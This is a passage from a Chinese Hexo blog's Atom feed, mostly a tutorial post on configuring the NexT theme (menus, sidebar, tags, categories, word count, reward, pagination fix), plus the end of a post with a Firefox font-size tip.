id="firefox字体太小"><a href="#firefox字体太小" class="headerlink" title="firefox字体太小"></a>firefox字体太小</h3><p>如果在<strong>菜单</strong>–&gt;<strong>缩放</strong>那里搞的话,只要换个选项卡就又那么小了,所以要来一个一劳永逸的</p><p><img src="Snipaste_2020-04-10_00-26-09.png" alt="Snipaste_2020-04-10_00-26-09"></p><ol><li><p><code>about:config</code></p><p>会跳出这么一个界面</p><p><img src="Snipaste_2020-04-09_23-46-38.png" alt="Snipaste_2020-04-09_23-46-38"></p></li><li><p>当然选择接受风险啦</p></li><li><p>搜索<code>layout.css.devPixelsPerPx</code></p><p>把默认的<code>-1</code>,调成<code>1.5</code></p><p>1.5即150%,可以由着你们自己的感觉调整</p></li><li><p>该页面不会变,但是你可以去别的页面看看</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;带着kali一起走&quot;&gt;&lt;a href=&quot;#带着kali一起走&quot; class=&quot;headerlink&quot; title=&quot;带着kali一起走&quot;&gt;&lt;/a&gt;带着kali一起走&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本来想装arch的来着,久仰邪教大名&lt;/p&gt;
&lt;p&gt;&lt;co
      
    
    </summary>
    
    
      <category term="linux" scheme="https://mercer5.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://mercer5.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>next主题配置</title>
    <link href="https://mercer5.github.io/2020/04/08/next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"/>
    <id>https://mercer5.github.io/2020/04/08/next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/</id>
    <published>2020-04-08T05:54:40.000Z</published>
    <updated>2020-08-24T15:30:09.746Z</updated>
    
    <content type="html"><![CDATA[<h1 id="next主题配置"><a href="#next主题配置" class="headerlink" title="next主题配置"></a>next主题配置</h1><h2 id="Scheme"><a href="#Scheme" class="headerlink" title="Scheme"></a>Scheme</h2><p>外观</p><ul><li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li><li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li><li>Pisces - 双栏 Scheme，小家碧玉似的清新</li></ul><p>Scheme 的切换通过更改 <strong>主题配置文件</strong>，搜索 scheme 关键字。 你会看到有三行 scheme 的配置，将你需用启用的 scheme 前面注释符号去除即可。</p><p>eg:选择 Pisces Scheme</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#scheme: Muse</span></span><br><span class="line"><span class="meta">#scheme: Mist</span></span><br><span class="line">scheme: Pisces</span><br></pre></td></tr></table></figure><h2 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h2><p>编辑 <strong>站点配置文件</strong>， 将 <code>language</code> 设置成你所需要的语言。建议明确设置你所需要的语言，例如选用简体中文，配置如下：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">language:</span> <span class="built_in">zh</span>-Hans</span><br></pre></td></tr></table></figure><p>目前支持的语言有</p><table><thead><tr><th align="left">语言</th><th align="left">代码</th><th align="left">设定示例</th></tr></thead><tbody><tr><td align="left">English</td><td align="left"><code>en</code></td><td align="left"><code>language: en</code></td></tr><tr><td align="left">简体中文</td><td align="left"><code>zh-Hans</code></td><td align="left"><code>language: zh-Hans</code></td></tr><tr><td align="left">Français</td><td align="left"><code>fr-FR</code></td><td align="left"><code>language: fr-FR</code></td></tr><tr><td align="left">Português</td><td align="left"><code>pt</code></td><td align="left"><code>language: pt</code> or <code>language: pt-BR</code></td></tr><tr><td align="left">繁體中文</td><td align="left"><code>zh-hk</code> 或者 <code>zh-tw</code></td><td align="left"><code>language: zh-hk</code></td></tr><tr><td align="left">Русский язык</td><td align="left"><code>ru</code></td><td align="left"><code>language: ru</code></td></tr><tr><td align="left">Deutsch</td><td align="left"><code>de</code></td><td align="left"><code>language: de</code></td></tr><tr><td align="left">日本語</td><td align="left"><code>ja</code></td><td align="left"><code>language: ja</code></td></tr><tr><td align="left">Indonesian</td><td align="left"><code>id</code></td><td align="left"><code>language: id</code></td></tr><tr><td align="left">Korean</td><td align="left"><code>ko</code></td><td align="left"><code>language: ko</code></td></tr></tbody></table><h2 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h2><p>菜单配置包括三个部分，第一是菜单项（名称和链接），第二是菜单项的显示文本，第三是菜单项对应的图标。 NexT 使用的是 <a href="http://fontawesome.io/" target="_blank" rel="noopener">Font Awesome</a> 提供的图标</p><p>编辑 <strong>主题配置文件</strong>，修改以下内容：</p><ol><li><p>设定菜单内容，对应的字段是 <code>menu</code>。 菜单内容的设置格式是：<code>item name: link || icon_name</code>。其中 <code>item name</code>是一个名称，这个名称并不直接显示在页面上，她将用于匹配图标以及翻译;icon_name是<strong>font awesome</strong> 的图标名</p><p><strong>这里有一个问题,就是有图标名就没法进入正确的网页;必须把||及后面的删掉才行</strong></p><p>菜单示例配置</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> / </span><br><span class="line">  <span class="meta">#about: /about/ </span></span><br><span class="line"><span class="symbol">  tags:</span> <span class="meta-keyword">/tags/</span> </span><br><span class="line"><span class="symbol">  categories:</span> <span class="meta-keyword">/categories/</span> </span><br><span class="line"><span class="symbol">  archives:</span> <span class="meta-keyword">/archives/</span> </span><br><span class="line">  <span class="meta">#schedule: /schedule/ || calendar</span></span><br><span class="line">  <span class="meta">#sitemap: /sitemap.xml || sitemap</span></span><br><span class="line">  <span class="meta">#commonweal: /404/ || heartbeat</span></span><br></pre></td></tr></table></figure><p>除了 <code>home</code>， <code>archives</code> , <code>/</code>后面都需要手动创建这个页面</p><p>NexT 默认的菜单项有（标注 的项表示需要手动创建这个页面）：</p><table><thead><tr><th align="left">键值</th><th align="left">设定值</th><th align="left">显示文本（简体中文）</th></tr></thead><tbody><tr><td align="left">home</td><td align="left"><code>home: /</code></td><td align="left">主页</td></tr><tr><td align="left">archives</td><td align="left"><code>archives: /archives</code></td><td align="left">归档页</td></tr><tr><td align="left">categories</td><td align="left"><code>categories: /categories</code></td><td align="left">分类页</td></tr><tr><td align="left">tags</td><td align="left"><code>tags: /tags</code></td><td align="left">标签页</td></tr><tr><td align="left">about</td><td align="left"><code>about: /about</code></td><td align="left">关于页面</td></tr><tr><td align="left">commonweal</td><td align="left"><code>commonweal: /404.html</code></td><td align="left">公益 404</td></tr></tbody></table></li><li><p>设置菜单项的显示文本。在第一步中设置的菜单的名称并不直接用于界面上的展示。Hexo 在生成的时候将使用 这个名称查找对应的语言翻译，并提取显示文本。这些翻译文本放置在 NexT 主题目录下的 <code>languages/{language}.yml</code> （<code>{language}</code> 为你所使用的语言）。</p><p>以简体中文为例，若你需要添加一个菜单项，比如 <code>something</code>。那么就需要修改简体中文对应的翻译文件 <code>languages/zh-Hans.yml</code>，在 <code>menu</code> 字段下添加一项：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> 首页</span><br><span class="line"><span class="symbol">  archives:</span> 归档</span><br><span class="line"><span class="symbol">  categories:</span> 分类</span><br><span class="line"><span class="symbol">  tags:</span> 标签</span><br><span class="line"><span class="symbol">  about:</span> 关于</span><br><span class="line"><span class="symbol">  search:</span> 搜索</span><br><span class="line"><span class="symbol">  commonweal:</span> 公益<span class="number">404</span></span><br><span class="line"><span class="symbol">  something:</span> 有料</span><br></pre></td></tr></table></figure></li><li><p>设定菜单项的图标，对应的字段是 <code>menu_icons</code>。<code>enable</code> 可用于控制是否显示图标，你可以设置成 <code>false</code> 来去掉图标。</p><p>菜单图标配置示例</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>在菜单图标开启的情况下，如果菜单项与菜单未匹配（没有设置或者无效的 Font Awesome 图标名字） 的情况下，NexT 将会使用 作为图标。</p></li></ol><h2 id="侧栏"><a href="#侧栏" class="headerlink" title="侧栏"></a>侧栏</h2><h3 id="主体"><a href="#主体" class="headerlink" title="主体"></a>主体</h3><p>默认情况下，侧栏仅在文章页面（拥有目录列表）时才显示，并放置于右侧位置。 可以通过修改 <strong>主题配置文件</strong> 中的 <code>sidebar</code> 字段来控制侧栏的行为。侧栏的设置包括两个部分，其一是侧栏的位置， 其二是侧栏显示的时机。</p><ol><li><p>设置侧栏的位置，修改 <code>sidebar.position</code> 的值，支持的选项有：</p><ul><li>left - 靠左放置</li><li>right - 靠右放置</li></ul><p>目前仅 Pisces Scheme 支持 <code>position</code> 配置。</p></li><li><p>设置侧栏显示的时机，修改 <code>sidebar.display</code> 的值，支持的选项有：</p><ul><li><code>post</code> - 默认行为，在文章页面（拥有目录列表）时显示</li><li><code>always</code> - 在所有页面中都显示</li><li><code>hide</code> - 在所有页面中都隐藏（可以手动展开）</li><li><code>remove</code> - 完全移除</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">sidebar:</span></span><br><span class="line">  <span class="meta"># Sidebar Position, available value: left | right (only for Pisces | Gemini).</span></span><br><span class="line"><span class="symbol">  position:</span> left</span><br><span class="line">  <span class="meta">#position: right</span></span><br><span class="line"></span><br><span class="line">  Sidebar Display, available value (only for Muse | Mist):</span><br><span class="line">  </span><br><span class="line">  <span class="meta">#display: post    <span class="comment">// 默认显示方式</span></span></span><br><span class="line">  <span class="meta">#display: always  <span class="comment">// 一直显示</span></span></span><br><span class="line"><span class="symbol">  display:</span> hide     <span class="comment">// 初始隐藏</span></span><br><span class="line">  <span class="meta">#display: remove  <span class="comment">// 移除侧边栏</span></span></span><br></pre></td></tr></table></figure></li></ol><h3 id="社交链接"><a href="#社交链接" class="headerlink" title="社交链接"></a>社交链接</h3><p>打开 <code>themes/next/_config.yml</code> 文件,搜索关键字 <code>social</code> ,然后添加社交站点名称与地址即可。</p><h3 id="社交图标"><a href="#社交图标" class="headerlink" title="社交图标"></a>社交图标</h3><p>打开 <code>themes/next/_config.yml</code> 文件,搜索关键字 <code>social_icons</code> ，添加社交站点名称（注意大小写）图标，<a href="http://fontawesome.dashgame.com/" target="_blank" rel="noopener">Font Awesome</a>图标地。</p><h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><p>编辑 <strong>主题配置文件</strong>， 修改字段 <code>avatar</code>,删掉前面的#号,值设置成头像的链接地址。其中，头像的链接地址可以是：</p><table><thead><tr><th align="left">地址</th><th align="left">值</th></tr></thead><tbody><tr><td align="left">完整的互联网 URI</td><td align="left"><code>http://example.com/avatar.png</code></td></tr><tr><td align="left">站点内的地址</td><td align="left">将头像放置主题目录下的 <code>source/uploads/</code> （新建 uploads 目录若不存在） 配置为：<code>avatar: /uploads/avatar.png</code>或者 放置在 <code>source/images/</code> 目录下 配置为：<code>avatar: /images/avatar.png</code></td></tr></tbody></table><h2 id="添加分类和标签"><a href="#添加分类和标签" class="headerlink" title="添加分类和标签"></a>添加分类和标签</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="生成“分类”页并添加tpye属性"><a href="#生成“分类”页并添加tpye属性" class="headerlink" title="生成“分类”页并添加tpye属性"></a>生成“分类”页并添加tpye属性</h4><p>打开命令行，进入博客所在文件夹。执行命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new<span class="built_in"> page </span>categories</span><br></pre></td></tr></table></figure><p>成功后会提示：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO  <span class="string">Created:</span> <span class="regexp">~/Documents/</span>blog<span class="regexp">/source/</span>categories/index.md</span><br></pre></td></tr></table></figure><p>根据上面的路径，找到<code>index.md</code>这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">12</span><span class="string">:51:51</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>添加<code>type: &quot;categories&quot;</code>到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">12</span><span class="string">:51:51</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"categories"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>保存并关闭文件。</p><h4 id="给文章添加“categories”属性"><a href="#给文章添加“categories”属性" class="headerlink" title="给文章添加“categories”属性"></a>给文章添加“categories”属性</h4><p>打开需要添加分类的文章，为其添加categories属性。下方的<code>categories: web前端</code>表示添加这篇文章到“web前端”这个分类。注意：hexo一篇文章只能属于一个分类，也就是说如果在“- web前端”下方添加“-xxx”，hexo不会产生两个分类，而是把分类嵌套（即该文章属于 “- web前端”下的 “-xxx ”分类）。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">aircrack-ng</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">19</span><span class="string">:35:51</span></span><br><span class="line"><span class="attr">categories:</span> <span class="string">虚拟机</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了<code>categories: xxx</code>的文章才会被收录到首页的“分类”中。</p><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><h4 id="生成“标签”页并添加tpye属性"><a href="#生成“标签”页并添加tpye属性" class="headerlink" title="生成“标签”页并添加tpye属性"></a>生成“标签”页并添加tpye属性</h4><p>打开命令行，进入博客所在文件夹。执行命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new<span class="built_in"> page </span>tags</span><br></pre></td></tr></table></figure><p>成功后会提示：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO  <span class="string">Created:</span> <span class="regexp">~/Documents/</span>blog<span class="regexp">/source/</span>tags/index.md</span><br></pre></td></tr></table></figure><p>根据上面的路径，找到<code>index.md</code>这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tages</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-14</span> <span class="number">10</span><span class="string">:51:06</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>添加<code>type: &quot;tags&quot;</code>到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tages</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-14</span> <span class="number">10</span><span class="string">:51:06</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"tags"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>保存并关闭文件。</p><h4 id="给文章添加“tags”属性"><a href="#给文章添加“tags”属性" class="headerlink" title="给文章添加“tags”属性"></a>给文章添加“tags”属性</h4><p>打开需要添加标签的文章，为其添加tags属性。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">aircrack-ng</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">19</span><span class="string">:35:51</span></span><br><span class="line"><span class="attr">categories:</span> <span class="string">虚拟机</span></span><br><span class="line"><span class="attr">tags:</span>   <span class="string">//标签</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">安全</span>   <span class="string">//在这里!!</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了<code>tags: xxx</code>的文章才会被收录到首页的“标签”中。</p><h2 id="不显示全文"><a href="#不显示全文" class="headerlink" title="不显示全文"></a>不显示全文</h2><p>编辑 <strong>主题配置文件</strong>， 修改字段 <code>auto_excerpt</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_excerpt:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">length:</span> <span class="number">100</span></span><br></pre></td></tr></table></figure><p><code>enable: true</code>:表示不完全显示</p><p><code>length: 100</code>:表示只显示100字</p><h2 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h2><p>编辑 <strong>主题配置文件</strong>， 修改字段 <code>Blog rolls</code></p><p>自己往下填就是了</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Blog rolls</span></span><br><span class="line"><span class="symbol">links_title:</span> 友情链接 <span class="meta">#标题</span></span><br><span class="line"><span class="symbol">links_layout:</span> block <span class="meta">#布局，一行一个连接</span></span><br><span class="line"><span class="meta">#links_layout: inline</span></span><br><span class="line"><span class="symbol">links:</span> <span class="meta">#连接</span></span><br><span class="line"><span class="symbol">  baidu:</span> http:<span class="comment">//example.com/</span></span><br><span class="line"><span class="symbol">  google:</span> http:<span class="comment">//example.com/</span></span><br></pre></td></tr></table></figure><h2 id="显示当前浏览进度"><a href="#显示当前浏览进度" class="headerlink" title="显示当前浏览进度"></a>显示当前浏览进度</h2><p>打开 <code>themes/next/_config.yml</code> ,搜索关键字 <code>scrollpercent</code> ,把 <code>false</code> 改为 <code>true</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Scroll percent label in b2t button</span></span><br><span class="line">scrollpercent: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>如果想把 <code>top</code>按钮放在侧边栏,打开 <code>themes/next/_config.yml</code> ,搜索关键字 <code>b2t</code> ,把 <code>false</code> 改为 <code>true</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Back to top in sidebar</span></span><br><span class="line"> b2t: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># Scroll percent label in b2t button</span></span><br><span class="line"> scrollpercent: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="统计功能"><a href="#统计功能" class="headerlink" title="统计功能"></a>统计功能</h2><p>在站点的根目录下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm i --save hexo-wordcount</span><br></pre></td></tr></table></figure><p>打开 <code>themes/next/_config.yml</code> ，搜索关键字 <code>post_wordcount</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Post wordcount display settings</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/willin/hexo-wordcount</span></span><br><span class="line">post_wordcount:</span><br><span class="line">  item_text: <span class="literal">true</span></span><br><span class="line">  <span class="comment">#字数统计</span></span><br><span class="line">  wordcount: <span class="literal">true</span></span><br><span class="line">  <span class="comment">#预览时间</span></span><br><span class="line">  min2read: <span class="literal">true</span></span><br><span class="line">  <span class="comment">#总字数,显示在页面底部</span></span><br><span class="line">  totalcount: <span class="literal">true</span></span><br><span class="line">  separated_meta: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="加载条"><a href="#加载条" class="headerlink" title="加载条"></a>加载条</h2><p>打开 <code>themes/next/_config.yml</code> ，搜索关键字 <code>pace</code>：</p><p>pace改为true</p><p>pace_theme后面选上面#后面中的一个</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Progress bar in the top during page loading.</span></span><br><span class="line">pace: <span class="literal">true</span></span><br><span class="line"><span class="meta"># Themes list:</span></span><br><span class="line"><span class="meta">#pace-theme-big-counter</span></span><br><span class="line"><span class="meta">#pace-theme-bounce</span></span><br><span class="line"><span class="meta">#pace-theme-barber-shop</span></span><br><span class="line"><span class="meta">#pace-theme-center-atom</span></span><br><span class="line"><span class="meta">#pace-theme-center-circle</span></span><br><span class="line"><span class="meta">#pace-theme-center-radar</span></span><br><span class="line"><span class="meta">#pace-theme-center-simple</span></span><br><span class="line"><span class="meta">#pace-theme-corner-indicator</span></span><br><span class="line"><span class="meta">#pace-theme-fill-left</span></span><br><span class="line"><span class="meta">#pace-theme-flash</span></span><br><span class="line"><span class="meta">#pace-theme-loading-bar</span></span><br><span class="line"><span class="meta">#pace-theme-mac-osx</span></span><br><span class="line"><span class="meta">#pace-theme-minimal</span></span><br><span class="line"><span class="meta"># For example</span></span><br><span class="line"><span class="meta"># pace_theme: pace-theme-center-simple</span></span><br><span class="line">pace_theme: pace-theme-center-simple</span><br></pre></td></tr></table></figure><h2 id="背景样式"><a href="#背景样式" class="headerlink" title="背景样式"></a>背景样式</h2><p>打开 <code>themes/next/_config.yml</code> ，搜索关键字 <code>pace</code>：</p><p>四个选一个,改动true/false</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Canvas-nest</span></span><br><span class="line"><span class="attr">canvas_nest:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># three_waves</span></span><br><span class="line"><span class="attr">three_waves:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># canvas_lines</span></span><br><span class="line"><span class="attr">canvas_lines:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># canvas_sphere</span></span><br><span class="line"><span class="attr">canvas_sphere:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="添加打赏功能"><a href="#添加打赏功能" class="headerlink" title="添加打赏功能"></a>添加打赏功能</h2><p><strong>主题配置文件</strong>，搜索reward关键词，添加打赏的配置信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Reward</span><br><span class="line"># If true, reward would be displayed in every article by default.</span><br><span class="line"># And you can show or hide one article specially through add page variable &#96;reward: true&#x2F;false&#96;.</span><br><span class="line">reward:</span><br><span class="line">  enable: true  &#x2F;&#x2F;默认是false，改为true</span><br><span class="line">  comment: 您的支持是对我最大的鼓励</span><br><span class="line">  wechatpay: &#x2F;images&#x2F;wechatpay.jpg  #图片链接或图片相对路径,当然也可以是绝对路径</span><br><span class="line">  alipay: &#x2F;images&#x2F;alipay.jpg      #同上</span><br></pre></td></tr></table></figure><h2 id="开启版权声明"><a href="#开启版权声明" class="headerlink" title="开启版权声明"></a>开启版权声明</h2><p>打开<strong>主题配置文件</strong>,搜索关键字 post_copyright </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  enable: true  &#x2F;&#x2F;默认为false</span><br><span class="line">  license: CC BY-NC-SA 3.0</span><br><span class="line">  license_url: https:&#x2F;&#x2F;creativecommons.org&#x2F;licenses&#x2F;by-nc-sa&#x2F;3.0&#x2F;</span><br></pre></td></tr></table></figure><h2 id="分页问题"><a href="#分页问题" class="headerlink" title="分页问题"></a>分页问题</h2><p>网页往下翻的时候发现一个奇奇怪怪的东西</p><p><img src="Snipaste_2020-04-08_13-41-26.png" alt="Snipaste_2020-04-08_13-41-26"></p><p>这能忍???</p><p>找到<code>themes\next\layout\_partials\pagination.swig</code></p><p>修改代码为</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> page.prev or page.next %&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-variable">&#123;&#123;</span></span><br><span class="line"><span class="template-variable">      paginator(&#123;</span></span><br><span class="line"><span class="template-variable">        prev_text: '&lt;',</span></span><br><span class="line"><span class="template-variable">        next_text: '&gt;',</span></span><br><span class="line"><span class="template-variable">        mid_size: 1</span></span><br><span class="line"><span class="template-variable">      &#125;)</span></span><br><span class="line"><span class="template-variable">    &#125;&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br></pre></td></tr></table></figure><p>然后就正常了</p><p><img src="Snipaste_2020-04-08_13-45-49.png" alt="Snipaste_2020-04-08_13-45-49"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;next主题配置&quot;&gt;&lt;a href=&quot;#next主题配置&quot; class=&quot;headerlink&quot; title=&quot;next主题配置&quot;&gt;&lt;/a&gt;next主题配置&lt;/h1&gt;&lt;h2 id=&quot;Scheme&quot;&gt;&lt;a href=&quot;#Scheme&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>学习环境搭建</title>
    <link href="https://mercer5.github.io/2020/04/08/%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
